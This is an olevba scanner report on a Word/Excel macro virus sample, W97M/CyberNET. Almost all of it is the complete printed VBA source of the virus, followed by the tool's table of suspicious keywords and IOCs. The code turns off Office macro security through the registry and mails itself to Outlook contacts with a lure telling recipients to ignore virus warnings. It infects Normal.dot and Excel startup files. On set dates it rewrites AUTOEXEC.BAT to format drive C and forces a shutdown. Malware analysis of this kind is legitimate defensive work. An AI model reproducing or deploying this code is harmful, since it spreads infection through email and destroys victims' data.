olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Cybernet-e950541573ddbbb24f19c3ec4c84331f93f10aa7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Cybernet-e950541573ddbbb24f19c3ec4c84331f93f10aa7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'W97M/CyberNET (C)2000 - Indonesia By AnomOke! "I'm NOT Responsible For Any Damage That Posible Cause By My Virus...!!!"
Application.EnableCancelKey = wdCancelDisabled: Options.SaveInterval = 1: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Application.DisplayRecentFiles = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else: Options.VirusProtection _
= False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: End If
Call GN8966
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
Randomize: For QQ5139 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next QQ5139
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Call JS1682: End If
BO7555 = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
IB6756 = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.Description <> "CyberNET" Or Left(ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set HN111 = ActiveDocument.VBProject.VBComponents
Call SI1130(HN111)
HN111(1).CodeModule. _
AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, IB6756 - 19))
ActiveDocument.VBProject.Description = "CyberNET"
End If
If NormalTemplate.VBProject.Description <> "CyberNET" Or Left(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set HN111 = NormalTemplate.VBProject.VBComponents
Call SI1130(HN111)
Randomize
Dim EB983(1 To 37) As String
EB983(1) = "DR1464"
EB983(2) = "AD2218"
EB983(3) = "HO5497"
EB983(4) = "VA499"
EB983(5) = "MK9444"
EB983(6) = "BO7555"
EB983(7) = "IB6756"
EB983(8) = "HN111"
EB983(9) = "RT5728"
EB983(10) = "HN6827"
EB983(11) = "PS5252"
EB983(12) = "SS2540"
EB983(13) = "GN8966"
EB983(14) = "GM4018"
EB983(15) = "QG60"
EB983(16) = "DQ9759"
EB983(17) = "OP9533"
EB983(18) = "OH5732"
EB983(19) = "IB4937"
EB983(20) = "BS527"
EB983(21) = "SI1130"
EB983(22) = "JU72"
EB983(23) = "PA2626"
EB983(24) = "QQ5139"
EB983(25) = "BC9383"
EB983(26) = "SN485"
EB983(27) = "UE955"
EB983(28) = "MI6113"
EB983(29) = "PN2542"
EB983(30) = "IV8963"
EB983(31) = "NA9337"
EB983(32) = "BT8795"
EB983(33) = "JS1682"
EB983(34) = "SQ2640"
EB983(35) = "NV9910"
EB983(36) = "DP752"
EB983(37) = _
"EB983"
For SS2540 = 1 To 37
RT5728 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call MK9444(RT5728, EB983(SS2540))
Next SS2540
ActiveDocument.Saved = True
HN111(1).CodeModule. _
AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, BO7555 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & _
"If Dialogs(80).Show <> 0 Then Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub")
HN111(1).Name = "UE955"
NormalTemplate.VBProject.Description = "CyberNET"
End If
Set MI6113 = CreateObject("Excel.Application")
If UCase(Dir(MI6113.Application.StartupPath + "\CyberNET.xls")) <> UCase("CYBERNET.XLS") Or Day(Now) = Minute(Now) Then
If UCase(Dir(MI6113.Application.StartupPath + "\CyberNET.xls")) = UCase("CYBERNET.XLS") Then _
SetAttr (MI6113.Application.StartupPath + "\CyberNET.xls"), vbArchive
If Dir(MI6113.Application.StartupPath + "\*.xl?") <> "" Then _
Kill (MI6113.Application.StartupPath + "\*.xl?")
Set PN2542 = MI6113.Workbooks.Add
PN2542.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 18)
PN2542.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 151, "Attachments.Add ActiveWorkbook.FullName"
PN2542.SaveAs MI6113.Application.StartupPath & "\CyberNET.xls"
MI6113.ActiveWorkbook.VBProject.Description = "CyberNET"
MI6113.ActiveWindow.Visible = False
MI6113.Workbooks("CyberNET.xls").Save
MI6113.Quit
SetAttr (MI6113.Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
If IB6756 <> 0 And BO7555 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function MK9444(PS5252, HN6827 As String)
On Error Resume Next
Dim DR1464 As Long: Dim AD2218 As Long: Dim HO5497 As Long: Dim VA499 As Long
With ActiveDocument.VBProject.VBComponents(1).CodeModule
DR1464 = 1: AD2218 = 1: HO5497 = .CountOfLines: VA499 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HN6827, DR1464, AD2218, HO5497, VA499, True)
DP752 = .Lines(DR1464, 1)
DP752 = _
Left(DP752, AD2218 - 1) & PS5252 & _
Mid(DP752, VA499)
.ReplaceLine DR1464, DP752
DR1464 = HO5497 + 1: AD2218 = 1
HO5497 = .CountOfLines
VA499 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function SI1130(HN111)
Dim JU72 As Object
For Each JU72 In HN111
JU72.CodeModule.DeleteLines 1, _
JU72.CodeModule.CountOfLines
Next JU72
End Function
Private Function GN8966()
On Error Resume Next
Dim DQ9759, OP9533, OH5732
Set DQ9759 = CreateObject("Outlook.Application")
Set OP9533 = DQ9759.GetNameSpace("MAPI")
If GetSetting("Office", "CyberNET", "CyberNET") <> "(C)2000 - Indonesia By AnomOke!" Then
If DQ9759 = "Outlook" Then
OP9533.Logon "profile", "password"
For GM4018 = 1 To OP9533.AddressLists. _
Count 'anti-heuristic for stupid Norton antivirus scanner
Set SN485 = OP9533.AddressLists(GM4018)
PA2626 = 1
Set OH5732 = DQ9759.CreateItem(0)
For QG60 = 1 To SN485.AddressEntries.Count
BC9383 = SN485.AddressEntries(PA2626)
OH5732.Recipients.Add BC9383
PA2626 = _
PA2626 + 1
If PA2626 > 50 Then QG60 = SN485.AddressEntries.Count
Next QG60
OH5732.Subject = "You've GOT Mail !!!"
OH5732.Body = "Please, saved the document after you read and don't show to anyone else. The document is also VIRUS FREE...so DISREGARD the virus protection warning !!!"
OH5732. _
Attachments.Add ActiveDocument.FullName
OH5732. _
Send 'anti-heuristic for stupid McAfee antivirus scanner
BC9383 = ""
Next GM4018
OP9533.Logoff
End If
SaveSetting "Office", "CyberNET", "CyberNET", "(C)2000 - Indonesia By AnomOke!"
End If
End Function
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
For NV9910 = 1 To 30
SQ2640 = (Chr(65 + Int(Rnd * 12))) & NV9910
Range(SQ2640).AddComment
Range(SQ2640).Comment.Visible = True
Range(SQ2640).Comment.Text Text:="(C)2000 - CyberNET From Indonesia"
Range(SQ2640).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300): Next NV9910
ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName: Call JS1682: End If
Set IV8963 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Or Day(Now) = Minute(Now) Then
Set NA9337 = GetObject(, "Word.Application")
If NA9337 = "" Then
Set NA9337 = CreateObject("Word.Application")
BT8795 = True
End If
If Dir(Application.TemplatesPath + "\Normal.dot") <> "" Then Kill (Application.TemplatesPath + "\Normal.dot")
If Dir(NA9337.Application.StartupPath + "\*.do?") <> "" Then _
Kill (NA9337.Application.StartupPath + "\*.do?")
Set HN111 = NA9337.NormalTemplate.VBProject.VBComponents
NA9337.Options.SaveNormalPrompt = False
HN111(1).CodeModule.InsertLines 1, "Public Sub UE955()" & vbCr & IV8963.Lines(5, 4) & vbCr & "End Sub"
NA9337.Run "Normal.ThisDocument.UE955"
Call SI1130(HN111)
HN111(1).CodeModule.InsertLines 1, IV8963. _
Lines(1, IV8963.CountOfLines - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & "If Dialogs(80).Show <> 0 Then Call Document_Close" _
& vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub"
NA9337.NormalTemplate.VBProject.Description = "CyberNET"
HN111(1).Name = "UE955"
HN111(1).CodeModule.ReplaceLine 151, "Attachments.Add ActiveDocument.FullName"
Set HN111 = Nothing
If BT8795 = True Then NA9337.Quit
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Then
Set MI6113 = CreateObject("Excel.Application")
Set PN2542 = MI6113.Workbooks.Add
PN2542.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, IV8963. _
Lines(1, IV8963.CountOfLines - 1)
PN2542.SaveAs FileName:=Application.StartupPath & "\CyberNET.xls", FileFormat:=xlNormal, AddToMru:=False
MI6113.ActiveWorkbook.VBProject.Description = "CyberNET"
MI6113.ActiveWindow.Visible = False
MI6113.Workbooks("CyberNET.xls").Save
MI6113.Quit
SetAttr (Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
End If
If Left(ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Or ActiveWorkbook.VBProject.Description <> "CyberNET" Then
Set HN111 = ActiveWorkbook.VBProject.VBComponents
Call SI1130(HN111)
ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, IV8963. _
Lines(1, IV8963.CountOfLines - 1)
ActiveWorkbook.VBProject.Description = "CyberNET"
End If
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("Window").Controls("Unhide...").Enabled = False
If UCase(Dir("C:\CyberNET.reg")) <> "CYBERNET.REG" Then
If Application.Version <> "9.0" Then
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close #1
Else
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Close #1
End If
End If
Shell "Regedit.exe /S C:\CyberNET.reg", vbHide
Call GN8966
Application.OnSheetActivate = "ThisWorkbook.Workbook_Deactivate"
End Sub
Private Function JS1682()
On Error Resume Next
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@ECHO OFF"
Print #1, "ECHO ###############################################################################"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO #               Vine...Vide...Vice...Moslem Power Never End...                #"
Print #1, "ECHO # I'm Really Sorry, This System Have Been Recycled By -= CyberNET =- Virus!!! #"
Print #1, "ECHO #                     Brought To You From INDONESIA...                        #"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO ###############################################################################"
Print #1, "CTTY NUL"
Print #1, "FORMAT C: /AUTOTEST /Q /U"
Close #1
Open ("C:\CONFIG.SYS") For Output As #2
Print #2, "SWITCHES=/N"
Print #2, "BREAK=OFF"
Close #2
MsgBox "Assalamualaikum Li Kulli Muslim...Moslem Power Never End..." & Chr(13) & "Nothing Can Stop << CyberNET >> Virus. Your System Has Already Infected !!!" & vbCr & "Now...I Am Outta Here...", vbCritical + vbOKOnly, "(C)2000 - CyberNET"
Shell ("RUNDLL.EXE user.exe,exitwindows"), vbHide
End Function









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CyberNET.reg        |Executable file name                         |
|IOC       |CYBERNET.REG        |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

